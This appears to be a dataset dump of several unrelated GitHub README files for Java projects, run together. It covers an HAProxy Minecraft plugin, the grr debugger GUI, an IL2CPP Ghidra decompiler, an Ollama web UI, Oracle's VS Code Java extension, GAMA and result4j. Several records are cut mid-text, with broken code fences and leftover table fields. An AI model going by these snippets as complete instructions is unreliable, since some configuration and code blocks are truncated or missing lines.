information about [HAProxy](https://www.haproxy.org/) and its uses can be
found [here](https://github.com/MinelinkNetwork/BungeeProxy/blob/master/README.md).

**Originally made by Andylizi**

**This plugins requires Java11 or higher!**

## Security Warning

Allowing both direct and proxied connections has significant security implications ‚Äî a malicious player can access the
server through their own HAProxy instance, thus tricking the server into believing the connection is coming from a
fake IP.

To counter this, this plugin implements IP whitelisting. **By default, only proxied connections from `localhost` will be
allowed** (direct connections aren't affected). You can add the IP/domain of your trusted HAProxy instance by
editing `whitelist.conf`, which can be found under the plugin data folder.

<details>
    <summary>Details of the whitelist format</summary>

```
# List of allowed proxy IPs
#
# An empty whitelist will disallow all proxies.
# Each entry must be an valid IP address, domain name or CIDR.
# Domain names will be resolved only once at startup.
# Each domain can have multiple A/AAAA records, all of them will be allowed.
# CIDR prefixes are not allowed in domain names.

127.0.0.0/8
::1/128
```

If you want to disable the whitelist (which you should never do), you can do so by
putting this line verbatim, before any other entries:

```

</details>

## Platform-specific Notes

#### BungeeCord

`proxy_protocol` needs to be enabled in BC `config.yml` for this plugin to work. (Not to be confused with the similar option in `paper.yml`)

Older versions of BC can in theory use [BungeeProxy](https://github.com/MinelinkNetwork/BungeeProxy) in parallel
with this plugin, but it hasn't been tested yet. Feedback is welcomed.

#### Spigot and its derivatives

[ProtocolLib](https://www.spigotmc.org/resources/protocollib.1997/) is a required dependency.
This plugin was developed using ProtocolLib 5.0.

#### Paper

New versions of Paper have built-in HAProxy support (proxied connection only). It's not compatible with this plugin, so please disable the `proxy-protocol` option in `paper.yml`.

#### Velocity

`haproxy-protocol` needs to be enabled in Velocity config for this plugin to work.

Versions older than 3.0 are not supported.

#### Java >= 9

**No need to use this, ImagineBreaker has already wiped it**

If errors like `NoClassDefFoundError: sun.misc.Unsafe`, `InaccessibleObjectException` and such are encountered,
please add `--add-opens java.base/java.lang.invoke=ALL-UNNAMED` to JVM arguments.

#### Java >= 18

**No need to use this, ImagineBreaker has already wiped it**

If errors like `IllegalAccessException: static final field has no write access` are encountered,
please upgrade the plugin to at least v3.0.2.

If you cannot upgrade for whatever reason, a temporary workaround would be to add
`-Djdk.reflect.useDirectMethodHandle=false` to JVM arguments.

Note that this argument will be removed in future Java releases.

## Metrics

This plugin uses [bStats](https://bStats.org) for metrics. It collects some basic information, like how many people
use this plugin and the total player count. You can opt out at any time by editing the config file under
`plugins/bStats/`.

dzaima/grr,master,"## A GUI for `gdb`, `rr`, `perf`, and more

![screenshot](https://dzaima.github.io/images/grr-rr-perf.png)

Build with `./build.py` (needs Java ‚â•11), run with `./run`. Examples below assume `grr` is linked to `./run`.

Simple example uses:
```sh
grr some-program # run program in gdb
grr -ld -d main some-program # open to a disassembly of the given function
grr --perf perf.data # view ./perf.data (equivalent to `grr --perf .`)
grr --rr # view latest rr trace
grr --rr some-program-1 # view specific rr trace
```

Some potential shell aliases:
```sh
alias rv=""grr --rr"" # view last rr run
alias gd=""grr -ld -d"" # ""gd symname ./file"" to disassemble given symbol
alias gv=""grr -ld -v"" # ""gv ./file"" to view file without running
alias gp=""grr --perf ."" # view perf.data in this directory
```
A custom layout can be saved with ctrl+shift+s, and loaded with `--layout /path/to/file`, or, if saved in `path/to/grr/local/<name>.txt`, with `-l<name>`.

### Key bindings

Where applicable, holding shift will reverse-execute on rr.

### gdb

A simple `grr some-program` will run the program in gdb. `grr some-program foo bar` will run the program with the arguments `foo` & `bar`.

`grr --core path/to/core path/to/program` to view a coredump.



### perf

`grr --perf path/to/perf.data` views data recorded by linux `perf`. `grr --perf path/to` pointing to a directory will implicitly read a `perf.data` file within it.

#### JIT symbol map

An attempt is made to read `/tmp/perf-<pid>.map` for JIT symbol ranges (disassembly not included). The file format is the same as that expected by `perf report`, that is, lines of `hexAddress hexLength name` - e.g. a line of `12AB E my function` represents a function starting at `0x12AB`, 14 bytes long, and the name `my function`.



### [rr](https://rr-project.org/)

The last `rr` recording can be replayed with `grr --rr`, and a specific recording with `grr --rr some-program-123`.

Note that, while the timeline window shows time as seconds, it's actually just interpolating the number of retired conditional branches between the nearest two events (‚âà syscall starts/ends) and thus is extremely inaccurate for performance purposes.

The ""timeline manager"" tab allows sampling stacktraces and building a flamegraph out of that - ""ticks"" mode will sample in the visible interval spaced at the specified resolutions, ""stepi"" and ""continue"" will sample running the specified action from the intial position. It is suggested to start from a position at or after the desired sampling interval, otherwise gdb may not pick up the necessary libraries and fail to symbolize.

While mainline rr works, [this fork](https://github.com/dzaima/rr/tree/lightweight-checkpoint) provides additional features:

- instruction-precise ordering of visited spots/samples on the timeline;
- the ability to jump exactly to any previously-visited location;
- much faster ticks-based sampling (as in, ~100 samples/second instead of ~3). Note that, for the faster sampling to properly symbolize, you may need to manually seek beforehand to around the target range (end of recording should work too) for gdb to pick up dynamic libraries.

`--rr` can be combined with `--perf`, `--cachegrind`, and `--jvm-out`.

`/tmp/perf-<pid>.map` is also attempted to be read as [`perf`'s format](#jit-symbol-map) for JIT symbols even without `--perf`.

If recorded as `perf record rr record ...` (as opposed to `rr record ...; perf record rr rerun`), JIT symbols will also see perf data.



### valgrind

Register and memory nibbles are colored based on memcheck status (green - fully defined, red - fully undefined, orange - some bits are defined).

```sh
# start your program:
valgrind --vgdb-error=0 --vgdb-shadow-registers=yes --vex-iropt-register-updates=allregs-at-each-insn ./your-program
# use --vgdb-error=1 instead to immediately run the program after connecting to it, breaking upon hitting an issue

# connect to it:
grr -x 'target remote | /path/to/vgdb' # i.e. the line printed by valgrind above
# if only one valgrind is running at a given time, the --pid=... can be omitted, allowing reusing the single command across multiple invocations
```

### cachegrind (incl. branch simulation)

As `valgrind` outputs its results per source file line and not instruction pointer/address, an adjusted binary must be used where debuginfo has been replaced. This is provided by `--prep-cachegrind`.

A usage sequence may therefore look like:

```sh
grr --prep-cachegrind output-executable input-executable # write the modified executable to output-executable
valgrind --tool=cachegrind --cache-sim=yes --branch-sim=yes --cachegrind-out-file=cachegrind-out ./output-executable # run program, output data to cachegrind-out; tweak to needs
grr --cachegrind cachegrind-out input-executable # view results
```



### Java JIT

![screenshot](https://dzaima.github.io/images/grr-java.png)

```sh
# program must not itself write anything to stdout! (else the output may interleave assembly data printing, and afaict there's no way to redirect it)
perf record java -XX:+UnlockDiagnosticVMOptions -XX:+DumpPerfMapAtExit -XX:+PrintAssembly ... > java-output # record all functions
perf record java -XX:+UnlockDiagnosticVMOptions -XX:+DumpPerfMapAtExit -XX:+DebugNonSafepoints -XX:CompileCommand=print,my.package.Foo::functionName ... > java-output # or record a specific function
# record all functions in my.package.Foo and everything under jdk.incubator.vector with:
#   -XX:CompileCommand=print,my.package.Foo::* -XX:CompileCommand=print,jdk.incubator.vector.*::*
# -XX:+DebugNonSafepoints is implicit for PrintAssembly, but not for CompileCommand (it might help with additional source mapping)

grr --perf . --jvm-out java-output --move /java-src/my/package:path/to/my/package
# the --move remaps my.package.Foo to path/to/my/package/Foo.java (/java-src/ is a hard-coded prefix to differentiate from other paths)
# it can be repeated, or excluded if source mapping isn't desired

# alternatively, just record function names as symbols, without assembly:
perf record java -XX:+UnlockDiagnosticVMOptions -XX:+DumpPerfMapAtExit ...
grr --perf . # plain ""perf report"" works too

# alternatively, all perf stuff can be left out, and ""grr --jvm-out java-output"" allows viewing plain disassemblies
```

Recorded program must be run with Java ‚â•16 (‚â•14 with removing `-XX:+DumpPerfMapAtExit`).

The `hsdis` plugin must not be installed, as with it OpenJDK disassembles the machine code itself, whereas here the disassembly needs to be done by gdb.



### Known issues

- I/O with the running program is clunky (`--tty inherit` may be preferable).
- Not all failure cases are properly handled and may result in Java stacktraces being printed; additionally in some scenarios the connection to GDB/MI ""desynchronizes"" and will cease functioning until the app is restarted. Running `grr assume-break` in the ""raw gdb"" tab may or may not fix this.
- Handling of demangling (be it in displaying or taking as input) is inconsistent.",0,0,1,MIT,,0.0
jakzo/Il2CppDecompiler,main,"Ghidra extension for decompiling code from a Unity IL2CPP game to C#.

## ‚û°Ô∏è Usage

> Note that it is powered by GPT4 so will require an OpenAI account to decompile functions.

1. Get an OpenAI platform account
   - [Get access to the OpenAI API](https://platform.openai.com/signup)
   - Generate an API key and save it somewhere safe
1. Get game outputs from Il2CppDumper
   - Install [Il2CppDumper](https://github.com/Perfare/Il2CppDumper)
   - Dump outputs (example command below)
     ```sh
     ./Il2CppDumper /path/to/game/GameAssembly.dll /path/to/game/resources/global-metadata.dat ./il2cpp_out
     ```
1. Set up Ghidra project
   - Install [Ghidra](https://github.com/NationalSecurityAgency/ghidra/releases)
   - Run `ghidraRun` -> create new project -> Import game code file (`GameAssembly.dll`)
   - Open game file -> auto analyze (default options) -> wait until done (could be an hour or more)
   - File -> Parse C source -> add `il2cpp.h` from Il2CppDumper output -> parse and wait until done
   - Window -> Script manager -> add Il2CppDumper directory (the one containing `ghidra_with_structs.py`) -> run `ghidra_with_structs.py` from the list -> follow prompts and wait until done
1. Check that decompilation works correctly
   - Find a function from the game in Ghidra and look through the decompiled C code to make sure it makes sense
   - For my game (Boneworks) the `il2cpp.h` generated by Il2CppDumper was missing a field in all class instances which made all field offsets wrong and caused property accesses to be off by 8 bytes
1. Rename functions (usually exception throwing functions)
   - The script will not run if there are unnamed functions being called (eg. `FUN_1234abcd`) in the method being decompiled
   - Find your function in Ghidra and look at the decompiled C code
   - There should be lots of `if (someVar != (SomeType)0x0) { ... } FUN_1234abcd();` which are null checks (since C# will throw a `NullReferenceException` if `x` is null in `x.y`)
   - Rename the exception function (`FUN_1234abcd` in the example above) to `ThrowNullReferenceException` and mark it as ""No Return""
   - In future I may automate this step
1. Install the Il2CppDecompiler.java script
   - Download the [Il2CppDecompiler.java script](./ghidra_scripts/Il2CppDecompiler.java)
   - Open the script manager in Ghidra (Window -> Script Manager)
   - Click the ""Manage Script Directories"" button
   - Add the directory containing the downloaded Il2CppDecompiler.java script
1. Run the Il2CppDecompiler.java script
   - Navigate to the method you want to decompile
   - Window -> Script Manager -> Il2CppDecompiler -> Follow the prompts

You can also run it in headless mode. First make sure the project is not currently open in Ghidra then run the command from [test-script.sh](./test-script.sh).

## üõ†Ô∏è Development

This repo contains an extension which doesn't really do anything yet. I planned to convert Ghidra's P-code (intermediate representation of machine code) to C# and build a UI for viewing/editing decompiled C# inside Ghidra (similar to the existing C decompiler) but this approach was taking too long so I pivoted to writing a script which sends the code to an LLM to do all the work for me. ü§∑

### Script

[./ghidra_scripts/Il2CppDecompiler.java](./ghidra_scripts/Il2CppDecompiler.java) contains the LLM-based script. It also still contains the proof-of-concept hacky string replacement approach I started with. You can edit the file as-is, but I like to clone the Ghidra source code, set that up and symlink Il2CppDecompiler.java into one of the ghidra_scripts folders there so that I get autocomplete with doc comments and can go to source of internal Ghidra functions. Run [link.sh](./link.sh) to automatically set that up then edit the [Il2CppDecompiler.java which is linked inside the ghidra directory](./ghidra/Ghidra/Features/Decompiler/ghidra_scripts/Il2CppDecompiler.java).

#### Debugging

You can run the script during development by making sure Ghidra is closed then running [test-script.sh](./test-script.sh). Before first run, make sure you set the variables in the script in [gradle.properties](./gradle.properties) or as environment variables. You can also attach a debugger by running the script like this:

```sh
MODE=debug-suspend ./test-script.sh
```

Note that this script is for Unix systems. You're probably using Windows so you'll have to convert it to a `.bat` script or something. Please open a PR if you do. üòÑ

### Extension

Note that the extension doesn't do anything yet. I originally intended to build an interface for the decompiled C# code, like the existing interface for decompiled C.

1. Create/modify [gradle.properties](gradle.properties) to contain:
   ```env
   GHIDRA_INSTALL_DIR=<absolute_path_to_your_ghidra_installation>
   ```
1. Then build with:
   ```sh
   gradle
   ```

ollama4j/ollama4j-web-ui,main,"# Ollama4j Web UI

A web UI for [Ollama](https://ollama.com/) written in Java
using [Spring Boot](https://spring.io/projects/spring-boot/) and [Vaadin](https://vaadin.com/) framework
and [Ollama4j](https://github.com/amithkoujalgi/ollama4j).

The goal of the project is to enable Ollama users coming from Java and Spring background to have a fully functional web
UI.

This project focuses on the raw capabilities of interacting with various models running on Ollama servers.

    end
```

#### Requirements

![Java](https://img.shields.io/badge/Java-17_+-blue.svg?style=just-the-message&labelColor=gray)

## Running the application

### Via Docker

If you already have a Ollama service running, the easiest way to get started is by using Docker by pointing to the host
address of Ollama. Find the image tags [here](https://hub.docker.com/r/amithkoujalgi/ollama4j-web-ui).

Run the Docker container by issuing this in your terminal:

```shell
docker run -it \
  -p 9090:8080 \
  -e OLLAMA_HOST_ADDR='http://192.168.10.1:11434' \
  amithkoujalgi/ollama4j-web-ui
```

### Via Docker Compose

If you want to start the Ollama service and the Ollama Web UI as Docker containers, create a
file called `docker-compose.yaml` and add the following contents in it:

```yaml
services:

  ollama:
    image: ollama/ollama
    ports:
      - ""11434:11434""
    volumes:
      - ~/ollama:/root/.ollama
    shm_size: 512mb

  ollama4j-web-ui:
    image: amithkoujalgi/ollama4j-web-ui
    ports:
      - ""9090:8080""
    environment:
      OLLAMA_HOST_ADDR: 'http://ollama:11434'
```

Then open up your terminal and then type in:

```shell
docker-compose -f /path/to/your/docker-compose.yaml up
```

And then you access the Ollama4j Web UI on http://localhost:9090.

### As a standalone JAR

Download the latest version from [here](https://github.com/ollama4j/ollama4j-web-ui/releases).

Or, you could download it via command-line.
Just make sure to specify the version you want to download.

```shell
VERSION=0.0.1; wget https://github.com/ollama4j/ollama4j-web-ui/releases/download/$VERSION/ollama4j-web-ui-$VERSION.jar
```

### Configure

Set environment variables.

```shell
export SERVER_PORT=8080
export OLLAMA_HOST_ADDR=http://localhost:11434
```

Or, if you would want to override the base config file, create a file `application.properties` and add the following
configuration.
Update the values of `server.port` and `ollama.url` according to your needs.

```shell
server.port=8080
logging.level.org.atmosphere = warn

spring.mustache.check-template-location = false
spring.servlet.multipart.max-file-size=50MB
spring.servlet.multipart.max-request-size=50MB

vaadin.launch-browser=true
vaadin.whitelisted-packages = com.vaadin,org.vaadin,dev.hilla,io.github.ollama4j

ollama.url=http://localhost:11434
ollama.request-timeout-seconds=120
```

### Run the app

```shell
java -jar ollama4j-web-ui-$VERSION.jar \
  --spring.config.location=/path/to/your/application.properties
```

Then open http://localhost:8080 in your browser to access the Ollama4j Web UI.

### Improvements

- [ ] Show errors on the UI. For example,
  `io.github.ollama4j.exceptions.OllamaBaseException: model ""llama3"" not found, try pulling it first`.
- [ ] Settings pane for configuring default params such as `top-p`, `top-k`, etc.

### Get Involved

Contributions are most welcome! Whether it's reporting a bug, proposing an enhancement, or helping
with code - any sort
of contribution is much appreciated.

[![License](https://img.shields.io/github/license/oracle/javavscode?style=for-the-badge&logo=apache)](https://github.com/oracle/javavscode/blob/main/LICENSE.txt)

Java Platform extension from Oracle brings full featured development support (edit-compile-debug & test cycle) to VS Code. It also offers support for Maven and Gradle projects. Applications using JDK 8 and above are supported.
## Getting Started
1. Setting up the JDK
    - If no JDK is present in your system then the extension can set things up for you. For more details refer to [JDK Downloader](#jdk-downloader) section.
    - Set the JDK in the `View | Command Palette | Preferences: Open User Settings | Jdk: Jdkhome` setting to point to the JDK that the Language Server will run on and also by default use for running and compiling projects.
        - The extension requires JDK 17 or newer to run.
    - Optionally, set a different JDK to compile and run projects in the `View | Command Palette | Preferences: Open User Settings | Jdk ‚Ä∫ Project: Jdkhome` setting.
        - By default, the __jdk.jdkhome__ setting is used. 
        - Projects can run on JDK 8 and above.  
    - For more information, see the section [Selecting the JDK](#selecting-the-jdk).
4. Use any one of the following ways to start coding, compiling and debugging in Java.
    - Simply create a new Java class with `public static void main(String[] args)` method.
    - Use the __Java: New File from Template...__ command to create a new Java file.
    - Use the __Java: New Project...__ command to create a new project.
    - Open the folder with existing __Maven__ or __Gradle__ project files (_pom.xml_ or _build.gradle, gradle.properties_).

## Supported Actions
In the VS Code command palette :
* __Java: New Project...__ allows creation of new Maven or Gradle project 
* __Java: New File from Template...__ add various files to currently selected open project. Files are:
    * Java - broad selection of various predefined Java classes
    * Unit tests - JUnit and TestNG templates for test suites and test cases
    * Other - various templates for Javascript, JSON, YAML, properties, ... files
* __Java: Compile Workspace__ - invoke Maven or Gradle build
* __Java: Clean Workspace__ - clean Maven or Gradle build
* __Download, install and Use JDK__ - allows download and installation of JDK binaries 
* Debugger __Java+...__ - start main class or test on selected JDK. More in [Debugger section](#debugger-and-launch-configurations)
* __Test Explorer__ for Java tests results visualization and execution including editor code Lenses.
* Maven and Gradle support including multi-project projects, subprojects opening and Gradle priming builds.
* __Java: Go To Test/Tested Class__ - Navigates to the corresponding test or source class file

## Project Explorer
Project Explorer provides an overview of logical project structure, groups sources together and greatly simplifies Java package structure exploration. Project Explorer is an addition to the classical workspace explorer. Use it to build, test, execute and operate your Maven and Gradle Java projects.  
![Project Explorer](vscode/images/project-explorer.png)

## Debugger and Launch Configurations
Language Server __Java+ ...__ launch configuration supports debugging and running Java applications using JDK11 or newer. 
1. The launch configuration (debugger) is invoked when `Run main | Debug main` code lense is selected in the code.
2. Or __Java+...__ is selected in __Run and Debug__ activity panel.  
![Debug configurations](vscode/images/debuggers.png)
### Launch Configurations
* __Launch Java App__ - Debug or Run current Java project
* __Attach to Port__ & __Attach to Process__ - Attach debugger actions. Available when __Java+ ...__ at the bottom of drop down list is selected.
    * Select this configuration, then click the ![Run](vscode/images/run.png) 
    * Select either from available process or enter the port to connect to JVM running with JDWP.
    * __Attach to Shared Memory__ is available on Windows in addtion to above mentioned _Attach..._

Default launch configurations provided by Language Server can modified in `launch.json` file.

### Run Configurations panel
Program arguments, VM options, evironment variables,... can be set in Run Configuration panel a part of Explorer. The panel is sufficient for all typical use-cases Java programmer faces. Only advanced, expert scenarios may require touching of `launch.json` (which still takes precedence).  
![Run Configuration](vscode/images/run_config.png) 

## JDK Downloader
If the system does not detect any JDK, the extension will offer a downloader and setup prompt to help you set up a JDK. This setup provides options for Oracle JDK, OpenJDK, and allows you to choose from any installed JDK on your system.
Alternatively, you can manually specify the path to JDK binaries by utilizing the JDK downloader.
You can also access the JDK downloader through the ""Download, install, and Use JDK"" option in the command palette.  
![JDK Downloader](vscode/images/jdk_downloader.png) 
## Enabling Java Preview Features 
When using preview features use the quick fix action option to easily enable them.

![Enable Preview](vscode/images/enable_preview.gif)

### Surround with refactorings
![Surrond with Refactorings](vscode/images/Surrond_With_refactorings.png)  

Some refactorings are two steps with like __Generate Override method__ ... where method to be overriden is selected in 2nd step:  

![Override refactoring](vscode/images/Override_refactoring.png)

### Change Method Parameters refactoring
Change method parameters refactoring is provided using dedicated form allowing to change, add, move, remove method parameters.  
![Change method parameters refactoring](vscode/images/change_method_params.png)

### Move Members Refactoring
Move members refactoring provides dedicated form as well.  
![Move members refactoring](vscode/images/move_refactoring.png)

### Some of supported refactorings:
* Convert to static import 
* Pull member up & down 
* Move class 
* Extract interface/method
* Split into declaration and assignment 
* Extract local variable
* Assign to variable
* Generate hashCode/equals
* Generate toString()
* Surround With refactoring
* For cycle refactoring
* try-catch refactoring
* switch() statement
* while() cycle
* Inline redundant variable 
* Constructor and method argument refactoring

## Formatter Preferences
Easily update default formatter preferences by adjusting a simple configuration option to tailor settings according to specific needs.  

Go to VSCode `View | Command Palette | Preferences:Open User Settings | Extensions | Java`  and set `Jdk ‚Ä∫ Format: Settings Path:` option to the formatter preferences file.

Please refer to [Java formatting preferences](https://github.com/oracle/javavscode/wiki/Java-formatting-preferences) wiki for more info.

## Hints Preferences
Easily update default hint preferences by adjusting a simple configuration option to tailor hint preferences to specific needs.

Go to VSCode `View | Command Palette | Preferences:Open User Settings | Extensions | Java`  and set `Jdk ‚Ä∫ Hints: Preferences:` option to the xml hint preferences file.

## Organize Imports
Out of the box support for organizing imports in Java sources is available. It removes unused imports, groups imports by packages and updates your imports whenever a file is saved. In addition to the defaults, there is a rich set of configuration options. 

Go to VSCode `View | Command Palette | Preferences:Open User Settings | Extensions | Java`  and search for _Jdk_ to set `Jdk > Java > Imports:` options:
* `Count For Using Star Import` - Class count to use a star-import, 999 is the default value
* `Count For Using Static Star Import` - Members count to use a static star-import, 999 is the default value
* `Groups` - Groups of import statements (specified by their package prefixes) and their sorting order. Import statements within a group are ordered alphabetically

And `View | Command Palette | Preferences:Open User Settings | Extensions > Java > On Save: Organize Imports` - Enable organize imports action on a document save

## JavaDoc smart editing
When adding JavaDoc to code Oracle Java Platform extension assists by suggesting to insert preformatted and prepopulated JavaDoc comment. Type `/**` above method signature and IDE offers to complete the JavaDoc. The action creates JavaDoc comment with all arguments prepared.  
![JavaDoc Completion](vscode/images/javadoc.png)

## Test Explorer
Oracle Java Platform extension provides Test Explorer view which allows to run all tests in a project, examine the results, go to source code and  run particular test.  
![Test Explorer](vscode/images/Test_explorer.png)

### Localisation support
Oracle Java Platform extension provides localisation support for _Japanese_ and _Simplified Chinese_. 
To switch language `Go to command Palette->Configure display language` select `ja` for _Japanese_ or `zh-cn` for _Simplified Chinese_ 
![localisation.gif](vscode/images/localisation.gif)

## Selecting the JDK
The JDK to build, run and debug projects is being searched in the following locations:

- `jdk.project.jdkhome` setting (workspace then user settings)
- `jdk.jdkhome` setting (workspace then user settings)
- `JDK_HOME` environment variable
- `JAVA_HOME` environment variable
- current system path

As soon as one of the settings is changed, the Language Server is restarted.

## How to use JDK early access builds
This setup makes it easier to experiment with early access JDK builds. Follow these steps to enable the use of an early access JDK:
Step-1: Navigate to `View | Command Palette | Preferences:Open User Settings | Jdk > Advanced > Disable: Nbjavac` and enable the checkbox. 

Step-2: Set the JDK in `View | Command Palette | Preferences:Open User Settings (JSON) ...` by updating the __jdk.jdkhome__ setting to point to the early access JDK path.

## Troubleshooting
If your extension is not starting and throwing some error like no JDK found even if you have a working JDK installed in your machine, then you can try deleting cache for the workspace using `View | Command Palette | Delete oracle java extension cache for this workspace`. 

## Workspace
The extension will analyze the content of the opened workspace, and relevant other files. If the workspace contains a lot of data, this may take a long time. It is therefore recommended to avoid adding unnecessarily big folders in a workspace. Specifically, it is not recommended to open user's home directory as a part of the workspace.

## Known Issue
If an action has been applied to the Maven `pom.xml` file through the extension, such as enabling a preview feature or adding a test runner framework, subsequent compile or run operations may fail. To resolve this issue, please follow the steps below:
1. Check the `pom.xml` file for any duplicated tags.
2. If duplicated tags are found, remove the extra tags and attempt to compile again.

There's a detailed tutorial that covers all cases in the [documentation](https://gama-platform.org/wiki/Installation), but for most user you can just go straight to the [**releases**](https://github.com/gama-platform/gama/releases) section of this repository and download the version that corresponds to your needs, we recommend you take a version bundled with a JDK.

### Run it from the source code

To run it from the source code you can either use `maven` to build the program yourself, or run it from `eclipse` in case you want to inspect the code and/or modify it. In both cases you will first need to **clone this repository** and to get the [Temurin distribution of JDK21](https://adoptium.net).

#### using eclipse

There is a more detailled explanation on the [website](https://gama-platform.org/wiki/InstallingGitVersion) about how to do so, here we will only give a fast and easy approach.

The _highly recommended configuration_ for working on this branch is [Eclipse for Java and DSL 2024-06](https://www.eclipse.org/downloads/packages/release/2024-06/r/eclipse-ide-java-and-dsl-developers), using a different version may expose you to some bugs.

Once you have imported the code base into your workspace, simply open the `gama.product` project and open either `gama.headless.product` or `gama.product` depending if you want to run gama with or without GUI.
In the `Overview` pane of the file, click on `Synchronize` and then `Launch an Eclipse application` and GAMA should start.

#### using maven

First install [maven](https://maven.apache.org/) on your computer, then open a terminal at the root of project and follow those steps:
1. go to the project `gama.annotations`
2. run the command:
```bash
mvn clean install
```
3. go to the project `gama.processor`
4. run the same mvn command
5. go to the project `gama.parent`
6. run the same mvn command one last time

The produced release should be stored in the project `gama.product` under the `target` folder.

## Reporting problems

If you spot a bug or want to suggest an improvement to GAMA, please do so by posting an issue here: [https://github.com/gama-platform/gama/issues](https://github.com/gama-platform/gama/issues). 

If you noticed something wrong/not up-to-date or a lack of information on something on the website and the documentation you could create an issue on the website's dedicated repository here: [https://github.com/gama-platform/gama-platform.github.io/issues](https://github.com/gama-platform/gama-platform.github.io/issues)

For general questions about modelling/development on GAMA you can either ask them in the [discussions](https://github.com/gama-platform/gama/discussions) of this repository or on the [mailing list](https://groups.google.com/g/gama-platform)

## Contributing

There are a few tutorials explaining how to create new functionalities in gama that you can find in the [developing extensions](https://gama-platform.org/wiki/DevelopingExtensions) section of the website, and one general explanation of the architecture of the software and important types used in the section [Introduction to GAMA Java API](https://gama-platform.org/wiki/Introduction-To-Gama-Java-API).

To contribute to the code you just have to submit a pull-request to this repository, if you encounter any problem to do so, feel free to ask about it either on the [github discussions](https://github.com/gama-platform/gama/discussions) or the [mailing list](https://groups.google.com/g/gama-platform).

## Preface

A complete rewrite & re-imagination of azanor's Thaumcraft for modern versions of Minecraft.
I am in no way associated with azanor and will not use any of their assets,
except perhaps temporarily the mod name (which I will also change upon release).

What version of Thaumcraft am I rewriting? None specifically. I am going to implement what
I enjoyed most from each version (my favorite being Thaumcraft 4.2). I plan to add
features that did not exist in the original mod, and change old features to give them
fresh new mechanics, visuals and names.

I happen to be Greek, Thaumaturgy literally means ""the act of performing miracles"".
Good pick azanor ;-)

sviperll/result4j,main,"Result-type for Java
====================

The project provides Result-type similar to Result-type in Rust that
allows to return either successful result or otherwise some kind of error.

In Java, the native way of reporting errors are exceptions, either checked or unchecked.
You do not need Result-type most of the time in Java-code, where
you can directly throw exceptions.
But there are situations, where more functional-style is used.
In such situations pure-functions are expected that throw no exceptions.
Handling exception in such situations can be cumbersome and require a lot of boilerplate code.
Result-type and associated helper-classes help with exception handling and
allow to write idiomatic functional code that can interact with methods that throw exceptions.

Result-type provides a way to pass error information as a first-class value through
the code written in functional style.
Routines are provided for interoperability of normal code that uses exception and
functional code that uses Result-type, so that exceptions can be caught and propagated as
errors in Result-type and then rethrown again later in the control-flow.

Requirements
------------

Java 21 is required.

Getting Started
---------------

result4j
[is available in Maven Central](https://central.sonatype.com/artifact/com.github.sviperll/result4j).

            <version>$LATEST_VERSION<!-- see above --></version>
        </dependency>
````

Project Values and Goals
------------------------

 * Small well-defined library that requires minimal maintenance
 * Work with the broad range of mainstream Java code (not tailored to some niche flavor of Java)
 * No bloat
 * Zero or minimal dependencies
 * Work with Java-modules (JPMS) and modern Java

Overview
--------

[API Documentation is available for reference](https://www.javadoc.io/doc/com.github.sviperll/result4j).

Result type can be either a successful result or some kind of error.

````java
Result<String, E> suc = Result.success(""Hello, World!"");
````

The above line declares successful result value.

````java
Result<String, Integer> err = Result.error(404);
````

The above line declares error-value.

````java
Result<String, Integer> result = ...;
switch (result) {
    case Result.Success<String, Integer>(String value) -> System.out.println(value);
    case Result.Error<String, Integer>(Integer code) ->
            throw new IOException(""%s: error"".formatted(code));
}
````

Pattern matching can be used to check unknown result value as shown above.

````java
Result<String, Integer> receivedResult = ...;
String value = receivedResult.orOnErrorThrow(code -> new IOException(""%s: error"".formatted(code)));
System.out.println(value);
````

Instead of a low-level pattern-matching,
higher level helper-methods are available in `Result`-class.
In the snippet above `orOnErrorThrow` is used to throw exception when `Result` contains error.

Result-type is created for interoperability between normal Java-code that throws exception and
more functional code.

````java
Catcher.ForFunctions<IOException> io =
    Catcher.of(IOException.class).forFunctions();
String concatenation =
        Stream.of(""a.txt"", ""b.txt"", ""c.txt"")
                .map(io.catching(name -> loadResource(name)))
                .collect(ResultCollectors.toSingleResult(Collectors.join()))
                .orOnErrorThrow(Function.identity());
````

Above code uses `Catcher` class to adapt functions that
throw exceptions to return Result-type instead.
`ResultCollectors` class contains helper-methods to collect multiple `Result`s into a single one.
You do not need `Catcher` class in normal Java-code, where you can directly throw exceptions.
But the above snippet can serve as an example of situations, where more functional-style is used.
In such situations pure-functions are expected that throw no exceptions.
Handling exception in such situations can be cumbersome and require a lot of boilerplate code.

````java
class MyMain {
    String loadResource(String name) throws IOException {
        // ...
    }

    public static void main(String[] args) throws IOException {
        Catcher.ForFunctions<IOException> io =
            Catcher.of(IOException.class).forFunctions();
        Function<String, Result<String, IOException>> f = io.catching(MyMain::loadResult);
        Result<String, IOException> result = f.apply(""my-resource"");
        String value = result.orOnErrorThrow(Function.identity());
        System.out.println(value);
    }
}
````

The example above shows the usage of the `catching` method of the `Catcher` class, that
allows to adapt exception throwing method and instead to have a method that returns `Result` with
exception representing as an error-value.

There is also an `AdaptingCatcher` class that allows to adapt or wrap exceptions.

````java
AdaptingCatcher.ForFunctions<IOException, PipelineException> io =
        Catcher.of(IOException.class).map(PipelineException::new).forFunctions();
AdaptingCatcher.ForFunctions<MLException, PipelineException> ml =
        Catcher.of(MLException.class).map(PipelineException::new).forFunctions();
List<Animal> animals1 =
        List.of(""cat.jpg"", ""dog.jpg"")
                .stream()
                .map(io.catching(Fakes::readFile))
                .map(Result.flatMapping(ml.catching(Fakes::recognizeImage)))
                .collect(ResultCollectors.toSingleResult(Collectors.toList()))
                .orOnErrorThrow(Function.identity());

ResultAssert.assertThat(animals)
        .isSuccess()
        .hasSuccessValueThat()
        .asInstanceOf(list(Animal.class))
        .containsExactlyInAnyOrderElementsOf(List.of(Animal.CAT, Animal.DOG));
````

Assertj helpers
---------------

Result4j now provides integration with the [AssertJ testing-framework](https://assertj.github.io/doc/).
To use it you should use a separate `assertj-result4j` artifact
(See [Maven Central Page](https://central.sonatype.com/artifact/com.github.sviperll/assertj-result4j)):

![Maven Central Version](https://img.shields.io/maven-central/v/com.github.sviperll/assertj-result4j)

````xml
<dependency>
    <groupId>com.github.sviperll</groupId>
    <artifactId>assertj-result4j</artifactId>
    <version>$LATEST_VERSION<!-- see above --></version>
</dependency>
````

The library allows you to write easy to read assertions in the style of AsserJ.

An assertion of a result of a successful operation:

````java
        assertThat(result)
                .isSuccess()
                .hasSuccessValueThat()
                .asInstanceOf(list(Integer.class))
                .containsExactlyInAnyOrderElementsOf(List.of(456, 234, 123));
````

An assertion of an error:

````java
        assertThat(result)
                .isError()
                .hasErrorThat()
                .asInstanceOf(InstanceOfAssertFactories.THROWABLE)
                .isExactlyInstanceOf(RuntimeException.class)
                .cause()
